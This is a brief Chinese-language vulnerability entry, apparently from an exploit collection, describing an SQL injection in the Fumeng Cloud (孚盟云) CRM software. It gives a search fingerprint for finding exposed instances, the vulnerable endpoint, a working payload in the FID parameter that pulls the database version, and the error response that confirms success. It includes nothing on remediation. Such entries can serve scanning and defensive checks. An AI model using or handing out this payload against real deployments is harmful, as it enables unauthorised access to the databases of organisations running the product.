# 浮盟云AjaxFormDefault存在SQL注入漏洞

孚盟云 ｜ SQL注入 ｜ —
- **指纹**：`app="孚盟软件-孚盟云"`
- **请求**：`POST /m/Dingding/Ajax/AjaxFormDefault.ashx HTTP/1.1`

**Payload**
```
action=getEditProductPic2&FID='-1/@@VERSION--
```
- **响应特征**：500 Microsoft